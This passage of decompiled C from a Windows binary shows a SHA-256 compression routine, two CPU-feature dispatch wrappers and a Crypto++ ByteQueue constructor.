      v6 = __ROR4__(v181[1], 6);
      v7 = (__ROR4__(v6, 5) ^ v6 ^ __ROR4__(v181[1], 25))
         + HIDWORD(v181[1])
         + v197
         + *v3
         + (DWORD2(v181[1]) ^ v181[1] & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
      v8 = __ROR4__(v181[0], 2);
      HIDWORD(v181[0]) += v7;
      HIDWORD(v181[1]) = (__ROR4__(v8, 11) ^ v8 ^ __ROR4__(v181[0], 22))
                       + v7
                       + (DWORD1(v181[0]) ^ (DWORD1(v181[0]) ^ LODWORD(v181[0])) & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
      v9 = __ROR4__(HIDWORD(v181[0]), 6);
      v10 = (__ROR4__(v9, 5) ^ v9 ^ __ROR4__(HIDWORD(v181[0]), 25))
          + DWORD2(v181[1])
          + v196
          + v3[1]
          + (DWORD1(v181[1]) ^ HIDWORD(v181[0]) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
      v11 = __ROR4__(HIDWORD(v181[1]), 2);
      DWORD2(v181[0]) += v10;
      DWORD2(v181[1]) = (__ROR4__(v11, 11) ^ v11 ^ __ROR4__(HIDWORD(v181[1]), 22))
                      + v10
                      + (LODWORD(v181[0]) ^ (LODWORD(v181[0]) ^ HIDWORD(v181[1])) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
      v12 = __ROR4__(DWORD2(v181[0]), 6);
      v13 = (__ROR4__(v12, 5) ^ v12 ^ __ROR4__(DWORD2(v181[0]), 25))
          + DWORD1(v181[1])
          + v195
          + v3[2]
          + (LODWORD(v181[1]) ^ DWORD2(v181[0]) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
      v14 = __ROR4__(DWORD2(v181[1]), 2);
      DWORD1(v181[0]) += v13;
      DWORD1(v181[1]) = (__ROR4__(v14, 11) ^ v14 ^ __ROR4__(DWORD2(v181[1]), 22))
                      + v13
                      + (HIDWORD(v181[1]) ^ (HIDWORD(v181[1]) ^ DWORD2(v181[1])) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
      v15 = __ROR4__(DWORD1(v181[0]), 6);
      v16 = (__ROR4__(v15, 5) ^ v15 ^ __ROR4__(DWORD1(v181[0]), 25))
          + LODWORD(v181[1])
          + v194
          + v3[3]
          + (HIDWORD(v181[0]) ^ DWORD1(v181[0]) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
      v17 = __ROR4__(DWORD1(v181[1]), 2);
      LODWORD(v181[0]) += v16;
      LODWORD(v181[1]) = (__ROR4__(v17, 11) ^ v17 ^ __ROR4__(DWORD1(v181[1]), 22))
                       + v16
                       + (DWORD2(v181[1]) ^ (DWORD2(v181[1]) ^ DWORD1(v181[1])) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
      v18 = __ROR4__(v181[0], 6);
      v19 = (__ROR4__(v18, 5) ^ v18 ^ __ROR4__(v181[0], 25))
          + HIDWORD(v181[0])
          + v193
          + v3[4]
          + (DWORD2(v181[0]) ^ v181[0] & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
      v20 = __ROR4__(v181[1], 2);
      HIDWORD(v181[1]) += v19;
      HIDWORD(v181[0]) = (__ROR4__(v20, 11) ^ v20 ^ __ROR4__(v181[1], 22))
                       + v19
                       + (DWORD1(v181[1]) ^ (DWORD1(v181[1]) ^ LODWORD(v181[1])) & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
      v21 = __ROR4__(HIDWORD(v181[1]), 6);
      v22 = (__ROR4__(v21, 5) ^ v21 ^ __ROR4__(HIDWORD(v181[1]), 25))
          + DWORD2(v181[0])
          + v192
          + v3[5]
          + (DWORD1(v181[0]) ^ HIDWORD(v181[1]) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
      v23 = __ROR4__(HIDWORD(v181[0]), 2);
      DWORD2(v181[1]) += v22;
      DWORD2(v181[0]) = (__ROR4__(v23, 11) ^ v23 ^ __ROR4__(HIDWORD(v181[0]), 22))
                      + v22
                      + (LODWORD(v181[1]) ^ (LODWORD(v181[1]) ^ HIDWORD(v181[0])) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
      v24 = __ROR4__(DWORD2(v181[1]), 6);
      v25 = (__ROR4__(v24, 5) ^ v24 ^ __ROR4__(DWORD2(v181[1]), 25))
          + DWORD1(v181[0])
          + v191
          + v3[6]
          + (LODWORD(v181[0]) ^ DWORD2(v181[1]) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
      v26 = __ROR4__(DWORD2(v181[0]), 2);
      DWORD1(v181[1]) += v25;
      DWORD1(v181[0]) = (__ROR4__(v26, 11) ^ v26 ^ __ROR4__(DWORD2(v181[0]), 22))
                      + v25
                      + (HIDWORD(v181[0]) ^ (HIDWORD(v181[0]) ^ DWORD2(v181[0])) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
      v27 = __ROR4__(DWORD1(v181[1]), 6);
      v28 = (__ROR4__(v27, 5) ^ v27 ^ __ROR4__(DWORD1(v181[1]), 25))
          + LODWORD(v181[0])
          + v190
          + v3[7]
          + (HIDWORD(v181[1]) ^ DWORD1(v181[1]) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
      v29 = __ROR4__(DWORD1(v181[0]), 2);
      LODWORD(v181[1]) += v28;
      LODWORD(v181[0]) = (__ROR4__(v29, 11) ^ v29 ^ __ROR4__(DWORD1(v181[0]), 22))
                       + v28
                       + (DWORD2(v181[0]) ^ (DWORD2(v181[0]) ^ DWORD1(v181[0])) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
      v30 = __ROR4__(v181[1], 6);
      v31 = (__ROR4__(v30, 5) ^ v30 ^ __ROR4__(v181[1], 25))
          + HIDWORD(v181[1])
          + v189
          + v3[8]
          + (DWORD2(v181[1]) ^ v181[1] & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
      v32 = __ROR4__(v181[0], 2);
      HIDWORD(v181[0]) += v31;
      HIDWORD(v181[1]) = (__ROR4__(v32, 11) ^ v32 ^ __ROR4__(v181[0], 22))
                       + v31
                       + (DWORD1(v181[0]) ^ (DWORD1(v181[0]) ^ LODWORD(v181[0])) & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
      v33 = __ROR4__(HIDWORD(v181[0]), 6);
      v34 = (__ROR4__(v33, 5) ^ v33 ^ __ROR4__(HIDWORD(v181[0]), 25))
          + DWORD2(v181[1])
          + v188
          + v3[9]
          + (DWORD1(v181[1]) ^ HIDWORD(v181[0]) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
      v35 = __ROR4__(HIDWORD(v181[1]), 2);
      DWORD2(v181[0]) += v34;
      DWORD2(v181[1]) = (__ROR4__(v35, 11) ^ v35 ^ __ROR4__(HIDWORD(v181[1]), 22))
                      + v34
                      + (LODWORD(v181[0]) ^ (LODWORD(v181[0]) ^ HIDWORD(v181[1])) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
      v36 = __ROR4__(DWORD2(v181[0]), 6);
      v37 = (__ROR4__(v36, 5) ^ v36 ^ __ROR4__(DWORD2(v181[0]), 25))
          + DWORD1(v181[1])
          + v187
          + v3[10]
          + (LODWORD(v181[1]) ^ DWORD2(v181[0]) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
      v38 = __ROR4__(DWORD2(v181[1]), 2);
      DWORD1(v181[0]) += v37;
      DWORD1(v181[1]) = (__ROR4__(v38, 11) ^ v38 ^ __ROR4__(DWORD2(v181[1]), 22))
                      + v37
                      + (HIDWORD(v181[1]) ^ (HIDWORD(v181[1]) ^ DWORD2(v181[1])) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
      v39 = __ROR4__(DWORD1(v181[0]), 6);
      v40 = (__ROR4__(v39, 5) ^ v39 ^ __ROR4__(DWORD1(v181[0]), 25))
          + LODWORD(v181[1])
          + v186
          + v3[11]
          + (HIDWORD(v181[0]) ^ DWORD1(v181[0]) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
      v41 = __ROR4__(DWORD1(v181[1]), 2);
      LODWORD(v181[0]) += v40;
      LODWORD(v181[1]) = (__ROR4__(v41, 11) ^ v41 ^ __ROR4__(DWORD1(v181[1]), 22))
                       + v40
                       + (DWORD2(v181[1]) ^ (DWORD2(v181[1]) ^ DWORD1(v181[1])) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
      v42 = __ROR4__(v181[0], 6);
      v43 = (__ROR4__(v42, 5) ^ v42 ^ __ROR4__(v181[0], 25))
          + HIDWORD(v181[0])
          + v185
          + v3[12]
          + (DWORD2(v181[0]) ^ v181[0] & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
      v44 = __ROR4__(v181[1], 2);
      HIDWORD(v181[1]) += v43;
      HIDWORD(v181[0]) = (__ROR4__(v44, 11) ^ v44 ^ __ROR4__(v181[1], 22))
                       + v43
                       + (DWORD1(v181[1]) ^ (DWORD1(v181[1]) ^ LODWORD(v181[1])) & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
      v45 = __ROR4__(HIDWORD(v181[1]), 6);
      v46 = (__ROR4__(v45, 5) ^ v45 ^ __ROR4__(HIDWORD(v181[1]), 25))
          + DWORD2(v181[0])
          + v184
          + v3[13]
          + (DWORD1(v181[0]) ^ HIDWORD(v181[1]) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
      v47 = __ROR4__(HIDWORD(v181[0]), 2);
      DWORD2(v181[1]) += v46;
      DWORD2(v181[0]) = (__ROR4__(v47, 11) ^ v47 ^ __ROR4__(HIDWORD(v181[0]), 22))
                      + v46
                      + (LODWORD(v181[1]) ^ (LODWORD(v181[1]) ^ HIDWORD(v181[0])) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
      v48 = __ROR4__(DWORD2(v181[1]), 6);
      v49 = (__ROR4__(v48, 5) ^ v48 ^ __ROR4__(DWORD2(v181[1]), 25))
          + DWORD1(v181[0])
          + v183
          + v3[14]
          + (LODWORD(v181[0]) ^ DWORD2(v181[1]) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
      v50 = __ROR4__(DWORD2(v181[0]), 2);
      DWORD1(v181[1]) += v49;
      DWORD1(v181[0]) = (__ROR4__(v50, 11) ^ v50 ^ __ROR4__(DWORD2(v181[0]), 22))
                      + v49
                      + (HIDWORD(v181[0]) ^ (HIDWORD(v181[0]) ^ DWORD2(v181[0])) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
      v51 = __ROR4__(DWORD1(v181[1]), 6);
      v52 = (__ROR4__(v51, 5) ^ v51 ^ __ROR4__(DWORD1(v181[1]), 25))
          + LODWORD(v181[0])
          + v182
          + v3[15]
          + (HIDWORD(v181[1]) ^ DWORD1(v181[1]) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
      result = DWORD2(v181[0]) ^ DWORD1(v181[0]);
      v54 = __ROR4__(DWORD1(v181[0]), 2);
      v55 = v52 + (DWORD2(v181[0]) ^ (DWORD2(v181[0]) ^ DWORD1(v181[0])) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
      v56 = LODWORD(v181[1]) + v52;
      LODWORD(v181[1]) = v56;
      v57 = (__ROR4__(v54, 11) ^ v54 ^ __ROR4__(DWORD1(v181[0]), 22)) + v55;
      LODWORD(v181[0]) = v57;
      do
      {
        v3 += 16;
        v58 = DWORD2(v181[1]) ^ v56 & (DWORD2(v181[1]) ^ DWORD1(v181[1]));
        v59 = v56;
        v60 = __ROR4__(v56, 6);
        v61 = (__ROR4__(v60, 5) ^ v60 ^ __ROR4__(v59, 25)) + v58;
        v62 = __ROR4__(v183, 17);
        v63 = __ROR4__(v196, 7);
        v64 = HIDWORD(v181[1]) + *v3 + v61;
        v197 += v188 + (v62 ^ (v183 >> 10) ^ __ROR4__(v62, 2)) + (__ROR4__(v63, 11) ^ v63 ^ (v196 >> 3));
        v65 = v197 + v64;
        v66 = v57;
        v67 = DWORD1(v181[0]) ^ v57;
        v68 = v66;
        v69 = __ROR4__(v66, 2);
        HIDWORD(v181[0]) += v65;
        HIDWORD(v181[1]) = (__ROR4__(v69, 11) ^ v69 ^ __ROR4__(v68, 22)) + v65 + (DWORD1(v181[0]) ^ v67 & result);
        v70 = __ROR4__(HIDWORD(v181[0]), 6);
        v71 = (__ROR4__(v70, 5) ^ v70 ^ __ROR4__(HIDWORD(v181[0]), 25))
            + (DWORD1(v181[1]) ^ HIDWORD(v181[0]) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
        v72 = __ROR4__(v182, 17);
        v73 = __ROR4__(v195, 7);
        v74 = DWORD2(v181[1]) + v3[1] + v71;
        v196 += v187 + (v72 ^ (v182 >> 10) ^ __ROR4__(v72, 2)) + (__ROR4__(v73, 11) ^ v73 ^ (v195 >> 3));
        v75 = v196 + v74;
        v76 = __ROR4__(HIDWORD(v181[1]), 2);
        DWORD2(v181[0]) += v75;
        DWORD2(v181[1]) = (__ROR4__(v76, 11) ^ v76 ^ __ROR4__(HIDWORD(v181[1]), 22))
                        + v75
                        + (LODWORD(v181[0]) ^ (LODWORD(v181[0]) ^ HIDWORD(v181[1])) & v67);
        v77 = __ROR4__(DWORD2(v181[0]), 6);
        v78 = (__ROR4__(v77, 5) ^ v77 ^ __ROR4__(DWORD2(v181[0]), 25))
            + (LODWORD(v181[1]) ^ DWORD2(v181[0]) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
        v79 = __ROR4__(v197, 17);
        v80 = __ROR4__(v194, 7);
        v81 = DWORD1(v181[1]) + v3[2] + v78;
        v195 += v186 + (v79 ^ (v197 >> 10) ^ __ROR4__(v79, 2)) + (__ROR4__(v80, 11) ^ v80 ^ (v194 >> 3));
        v82 = v195 + v81;
        v83 = __ROR4__(DWORD2(v181[1]), 2);
        DWORD1(v181[0]) += v82;
        DWORD1(v181[1]) = (__ROR4__(v83, 11) ^ v83 ^ __ROR4__(DWORD2(v181[1]), 22))
                        + v82
                        + (HIDWORD(v181[1]) ^ (HIDWORD(v181[1]) ^ DWORD2(v181[1])) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
        v84 = __ROR4__(DWORD1(v181[0]), 6);
        v85 = (__ROR4__(v84, 5) ^ v84 ^ __ROR4__(DWORD1(v181[0]), 25))
            + (HIDWORD(v181[0]) ^ DWORD1(v181[0]) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
        v86 = __ROR4__(v196, 17);
        v87 = __ROR4__(v193, 7);
        v88 = LODWORD(v181[1]) + v3[3] + v85;
        v194 += v185 + (v86 ^ (v196 >> 10) ^ __ROR4__(v86, 2)) + (__ROR4__(v87, 11) ^ v87 ^ (v193 >> 3));
        v89 = v194 + v88;
        v90 = __ROR4__(DWORD1(v181[1]), 2);
        LODWORD(v181[0]) += v89;
        LODWORD(v181[1]) = (__ROR4__(v90, 11) ^ v90 ^ __ROR4__(DWORD1(v181[1]), 22))
                         + v89
                         + (DWORD2(v181[1]) ^ (DWORD2(v181[1]) ^ DWORD1(v181[1])) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
        v91 = __ROR4__(v181[0], 6);
        v92 = (__ROR4__(v91, 5) ^ v91 ^ __ROR4__(v181[0], 25))
            + (DWORD2(v181[0]) ^ v181[0] & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
        v93 = __ROR4__(v195, 17);
        v94 = __ROR4__(v192, 7);
        v95 = HIDWORD(v181[0]) + v3[4] + v92;
        v193 += v184 + (v93 ^ (v195 >> 10) ^ __ROR4__(v93, 2)) + (__ROR4__(v94, 11) ^ v94 ^ (v192 >> 3));
        v96 = v193 + v95;
        v97 = __ROR4__(v181[1], 2);
        HIDWORD(v181[1]) += v96;
        HIDWORD(v181[0]) = (__ROR4__(v97, 11) ^ v97 ^ __ROR4__(v181[1], 22))
                         + v96
                         + (DWORD1(v181[1]) ^ (DWORD1(v181[1]) ^ LODWORD(v181[1])) & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
        v98 = __ROR4__(HIDWORD(v181[1]), 6);
        v99 = (__ROR4__(v98, 5) ^ v98 ^ __ROR4__(HIDWORD(v181[1]), 25))
            + (DWORD1(v181[0]) ^ HIDWORD(v181[1]) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
        v100 = __ROR4__(v194, 17);
        v101 = __ROR4__(v191, 7);
        v102 = DWORD2(v181[0]) + v3[5] + v99;
        v192 += v183 + (v100 ^ (v194 >> 10) ^ __ROR4__(v100, 2)) + (__ROR4__(v101, 11) ^ v101 ^ (v191 >> 3));
        v103 = v192 + v102;
        v104 = __ROR4__(HIDWORD(v181[0]), 2);
        DWORD2(v181[1]) += v103;
        DWORD2(v181[0]) = (__ROR4__(v104, 11) ^ v104 ^ __ROR4__(HIDWORD(v181[0]), 22))
                        + v103
                        + (LODWORD(v181[1]) ^ (LODWORD(v181[1]) ^ HIDWORD(v181[0])) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
        v105 = __ROR4__(DWORD2(v181[1]), 6);
        v106 = (__ROR4__(v105, 5) ^ v105 ^ __ROR4__(DWORD2(v181[1]), 25))
             + (LODWORD(v181[0]) ^ DWORD2(v181[1]) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
        v107 = __ROR4__(v193, 17);
        v108 = __ROR4__(v190, 7);
        v109 = DWORD1(v181[0]) + v3[6] + v106;
        v191 += v182 + (v107 ^ (v193 >> 10) ^ __ROR4__(v107, 2)) + (__ROR4__(v108, 11) ^ v108 ^ (v190 >> 3));
        v110 = v191 + v109;
        v111 = __ROR4__(DWORD2(v181[0]), 2);
        DWORD1(v181[1]) += v110;
        DWORD1(v181[0]) = (__ROR4__(v111, 11) ^ v111 ^ __ROR4__(DWORD2(v181[0]), 22))
                        + v110
                        + (HIDWORD(v181[0]) ^ (HIDWORD(v181[0]) ^ DWORD2(v181[0])) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
        v112 = __ROR4__(DWORD1(v181[1]), 6);
        v113 = (__ROR4__(v112, 5) ^ v112 ^ __ROR4__(DWORD1(v181[1]), 25))
             + (HIDWORD(v181[1]) ^ DWORD1(v181[1]) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
        v114 = __ROR4__(v192, 17);
        v115 = __ROR4__(v189, 7);
        v116 = LODWORD(v181[0]) + v3[7] + v113;
        v190 += v197 + (v114 ^ (v192 >> 10) ^ __ROR4__(v114, 2)) + (__ROR4__(v115, 11) ^ v115 ^ (v189 >> 3));
        v117 = v190 + v116;
        v118 = __ROR4__(DWORD1(v181[0]), 2);
        LODWORD(v181[1]) += v117;
        LODWORD(v181[0]) = (__ROR4__(v118, 11) ^ v118 ^ __ROR4__(DWORD1(v181[0]), 22))
                         + v117
                         + (DWORD2(v181[0]) ^ (DWORD2(v181[0]) ^ DWORD1(v181[0])) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
        v119 = __ROR4__(v181[1], 6);
        v120 = (__ROR4__(v119, 5) ^ v119 ^ __ROR4__(v181[1], 25))
             + (DWORD2(v181[1]) ^ v181[1] & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
        v121 = __ROR4__(v191, 17);
        v122 = __ROR4__(v188, 7);
        v123 = HIDWORD(v181[1]) + v3[8] + v120;
        v189 += v196 + (v121 ^ (v191 >> 10) ^ __ROR4__(v121, 2)) + (__ROR4__(v122, 11) ^ v122 ^ (v188 >> 3));
        v124 = v189 + v123;
        v125 = __ROR4__(v181[0], 2);
        HIDWORD(v181[0]) += v124;
        HIDWORD(v181[1]) = (__ROR4__(v125, 11) ^ v125 ^ __ROR4__(v181[0], 22))
                         + v124
                         + (DWORD1(v181[0]) ^ (DWORD1(v181[0]) ^ LODWORD(v181[0])) & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
        v126 = __ROR4__(HIDWORD(v181[0]), 6);
        v127 = (__ROR4__(v126, 5) ^ v126 ^ __ROR4__(HIDWORD(v181[0]), 25))
             + (DWORD1(v181[1]) ^ HIDWORD(v181[0]) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
        v128 = __ROR4__(v190, 17);
        v129 = __ROR4__(v187, 7);
        v130 = DWORD2(v181[1]) + v3[9] + v127;
        v188 += v195 + (v128 ^ (v190 >> 10) ^ __ROR4__(v128, 2)) + (__ROR4__(v129, 11) ^ v129 ^ (v187 >> 3));
        v131 = v188 + v130;
        v132 = __ROR4__(HIDWORD(v181[1]), 2);
        DWORD2(v181[0]) += v131;
        DWORD2(v181[1]) = (__ROR4__(v132, 11) ^ v132 ^ __ROR4__(HIDWORD(v181[1]), 22))
                        + v131
                        + (LODWORD(v181[0]) ^ (LODWORD(v181[0]) ^ HIDWORD(v181[1])) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
        v133 = __ROR4__(DWORD2(v181[0]), 6);
        v134 = (__ROR4__(v133, 5) ^ v133 ^ __ROR4__(DWORD2(v181[0]), 25))
             + (LODWORD(v181[1]) ^ DWORD2(v181[0]) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
        v135 = __ROR4__(v189, 17);
        v136 = __ROR4__(v186, 7);
        v137 = DWORD1(v181[1]) + v3[10] + v134;
        v187 += v194 + (v135 ^ (v189 >> 10) ^ __ROR4__(v135, 2)) + (__ROR4__(v136, 11) ^ v136 ^ (v186 >> 3));
        v138 = v187 + v137;
        v139 = __ROR4__(DWORD2(v181[1]), 2);
        DWORD1(v181[0]) += v138;
        DWORD1(v181[1]) = (__ROR4__(v139, 11) ^ v139 ^ __ROR4__(DWORD2(v181[1]), 22))
                        + v138
                        + (HIDWORD(v181[1]) ^ (HIDWORD(v181[1]) ^ DWORD2(v181[1])) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
        v140 = __ROR4__(DWORD1(v181[0]), 6);
        v141 = (__ROR4__(v140, 5) ^ v140 ^ __ROR4__(DWORD1(v181[0]), 25))
             + (HIDWORD(v181[0]) ^ DWORD1(v181[0]) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
        v142 = __ROR4__(v188, 17);
        v143 = __ROR4__(v185, 7);
        v144 = LODWORD(v181[1]) + v3[11] + v141;
        v186 += v193 + (v142 ^ (v188 >> 10) ^ __ROR4__(v142, 2)) + (__ROR4__(v143, 11) ^ v143 ^ (v185 >> 3));
        v145 = v186 + v144;
        v146 = __ROR4__(DWORD1(v181[1]), 2);
        LODWORD(v181[0]) += v145;
        LODWORD(v181[1]) = (__ROR4__(v146, 11) ^ v146 ^ __ROR4__(DWORD1(v181[1]), 22))
                         + v145
                         + (DWORD2(v181[1]) ^ (DWORD2(v181[1]) ^ DWORD1(v181[1])) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
        v147 = __ROR4__(v181[0], 6);
        v148 = (__ROR4__(v147, 5) ^ v147 ^ __ROR4__(v181[0], 25))
             + (DWORD2(v181[0]) ^ v181[0] & (DWORD2(v181[0]) ^ DWORD1(v181[0])));
        v149 = __ROR4__(v187, 17);
        v150 = __ROR4__(v184, 7);
        v151 = HIDWORD(v181[0]) + v3[12] + v148;
        v185 += v192 + (v149 ^ (v187 >> 10) ^ __ROR4__(v149, 2)) + (__ROR4__(v150, 11) ^ v150 ^ (v184 >> 3));
        v152 = v185 + v151;
        v153 = __ROR4__(v181[1], 2);
        HIDWORD(v181[1]) += v152;
        HIDWORD(v181[0]) = (__ROR4__(v153, 11) ^ v153 ^ __ROR4__(v181[1], 22))
                         + v152
                         + (DWORD1(v181[1]) ^ (DWORD1(v181[1]) ^ LODWORD(v181[1])) & (DWORD2(v181[1]) ^ DWORD1(v181[1])));
        v154 = __ROR4__(HIDWORD(v181[1]), 6);
        v155 = (__ROR4__(v154, 5) ^ v154 ^ __ROR4__(HIDWORD(v181[1]), 25))
             + (DWORD1(v181[0]) ^ HIDWORD(v181[1]) & (DWORD1(v181[0]) ^ LODWORD(v181[0])));
        v156 = __ROR4__(v186, 17);
        v157 = __ROR4__(v183, 7);
        v158 = DWORD2(v181[0]) + v3[13] + v155;
        v184 += v191 + (v156 ^ (v186 >> 10) ^ __ROR4__(v156, 2)) + (__ROR4__(v157, 11) ^ v157 ^ (v183 >> 3));
        v159 = v184 + v158;
        v160 = __ROR4__(HIDWORD(v181[0]), 2);
        DWORD2(v181[1]) += v159;
        DWORD2(v181[0]) = (__ROR4__(v160, 11) ^ v160 ^ __ROR4__(HIDWORD(v181[0]), 22))
                        + v159
                        + (LODWORD(v181[1]) ^ (LODWORD(v181[1]) ^ HIDWORD(v181[0])) & (DWORD1(v181[1]) ^ LODWORD(v181[1])));
        v161 = __ROR4__(DWORD2(v181[1]), 6);
        v162 = (__ROR4__(v161, 5) ^ v161 ^ __ROR4__(DWORD2(v181[1]), 25))
             + (LODWORD(v181[0]) ^ DWORD2(v181[1]) & (LODWORD(v181[0]) ^ HIDWORD(v181[1])));
        v163 = __ROR4__(v185, 17);
        v164 = __ROR4__(v182, 7);
        v165 = DWORD1(v181[0]) + v3[14] + v162;
        v183 += v190 + (v163 ^ (v185 >> 10) ^ __ROR4__(v163, 2)) + (__ROR4__(v164, 11) ^ v164 ^ (v182 >> 3));
        v166 = v183 + v165;
        v167 = __ROR4__(DWORD2(v181[0]), 2);
        DWORD1(v181[1]) += v166;
        DWORD1(v181[0]) = (__ROR4__(v167, 11) ^ v167 ^ __ROR4__(DWORD2(v181[0]), 22))
                        + v166
                        + (HIDWORD(v181[0]) ^ (HIDWORD(v181[0]) ^ DWORD2(v181[0])) & (LODWORD(v181[1]) ^ HIDWORD(v181[0])));
        v168 = __ROR4__(DWORD1(v181[1]), 6);
        v169 = (__ROR4__(v168, 5) ^ v168 ^ __ROR4__(DWORD1(v181[1]), 25))
             + (HIDWORD(v181[1]) ^ DWORD1(v181[1]) & (HIDWORD(v181[1]) ^ DWORD2(v181[1])));
        v170 = __ROR4__(v184, 17);
        v171 = __ROR4__(v197, 7);
        v172 = LODWORD(v181[0]) + v3[15] + v169;
        v182 += v189 + (v170 ^ (v184 >> 10) ^ __ROR4__(v170, 2)) + (__ROR4__(v171, 11) ^ v171 ^ (v197 >> 3));
        v173 = v182 + v172;
        result = DWORD2(v181[0]) ^ DWORD1(v181[0]);
        v174 = __ROR4__(DWORD1(v181[0]), 2);
        v175 = v173 + (DWORD2(v181[0]) ^ (DWORD2(v181[0]) ^ DWORD1(v181[0])) & (HIDWORD(v181[0]) ^ DWORD2(v181[0])));
        v56 = LODWORD(v181[1]) + v173;
        LODWORD(v181[1]) = v56;
        v57 = (__ROR4__(v174, 11) ^ v174 ^ __ROR4__(DWORD1(v181[0]), 22)) + v175;
        LODWORD(v181[0]) = v57;
      }
      while ( (unsigned int)v3 < v198 );
      a2 = v200 + 16;
      v176 = v199;
      v200 += 16;
      if ( (v198 & 1) != 0 )
        break;
      v199->m128i_i32[0] += v57;
      v176[1].m128i_i32[0] += v56;
      v177 = HIDWORD(v181[0]);
      v178 = DWORD2(v181[0]);
      v176->m128i_i32[1] += DWORD1(v181[0]);
      v176->m128i_i32[2] += v178;
      v176->m128i_i32[3] += v177;
      v179 = DWORD2(v181[1]);
      result = DWORD1(v181[1]);
      v180 = HIDWORD(v181[1]);
      v176[1].m128i_i32[1] += DWORD1(v181[1]);
      v176[1].m128i_i32[2] += v179;
      v176[1].m128i_i32[3] += v180;
      a1 = v176;
      if ( (unsigned int)a2 >= v201 )
        return result;
LABEL_3:
      qmemcpy(v181, a1, sizeof(v181));
      v3 = (_DWORD *)v198;
    }
    v5 = _mm_add_epi32(_mm_loadu_si128(v199 + 1), (__m128i)v181[1]);
    v4 = _mm_add_epi32(_mm_loadu_si128(v199), (__m128i)v181[0]);
    v199[1] = v5;
    *v176 = v4;
  }
  while ( (unsigned int)a2 < v201 );
  return result;
}

//----- (0045F050) --------------------------------------------------------
__m128i *__cdecl sub_45F050(int *a1, int *a2)
{
  if ( !byte_4F0124 )
    sub_466590();
  if ( byte_4F012D )
    return sub_467D10((__m128i *)a1, (__m128i *)a2, 0x40u, 0);
  else
    return (__m128i *)sub_45C2D0(a1, a2);
}
// 4F0124: using guessed type char byte_4F0124;
// 4F012D: using guessed type char byte_4F012D;

//----- (0045F090) --------------------------------------------------------
__m128i *__cdecl sub_45F090(__int128 *a1, unsigned int *a2)
{
  if ( !byte_4F0124 )
    sub_466590();
  if ( byte_4F012D )
    return sub_467FB0((__m128i *)a1, (__m128i *)a2, 0x40u, 0);
  else
    return (__m128i *)sub_45D3D0(a1, a2);
}
// 4F0124: using guessed type char byte_4F0124;
// 4F012D: using guessed type char byte_4F012D;

//----- (0045F0D0) --------------------------------------------------------
int __thiscall sub_45F0D0(int this, int a2)
{
  int v3; // ecx
  _DWORD *v4; // esi
  void *v5; // eax
  int result; // eax

  *(_QWORD *)this = 0i64;
  *(_DWORD *)(this + 8) = 0;
  sub_435E90((void *)this, 0);
  v3 = a2;
  *(_DWORD *)this = &CryptoPP::ByteQueue::`vftable';
  *(_BYTE *)(this + 12) = a2 == 0;
  *(_DWORD *)(this + 4) = &CryptoPP::ByteQueue::`vftable';
  if ( !a2 )
    v3 = 256;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 24) = 0;
  *(_DWORD *)(this + 28) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_BYTE *)(this + 36) = 0;
  *(_DWORD *)(this + 16) = v3;
  v4 = operator new(0x1Cu);
  if ( v4 )
  {
    v5 = *(void **)(this + 16);
    v4[2] = -1;
    v4[3] = v5;
    if ( v5 )
      v5 = sub_45AEA0((size_t)v5);
    v4[4] = v5;
    v4[6] = 0;
    v4[5] = 0;
    *v4 = 0;
  }
  else
  {
    v4 = 0;
  }
  *(_DWORD *)(this + 24) = v4;
  result = this;
  *(_DWORD *)(this + 20) = v4;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
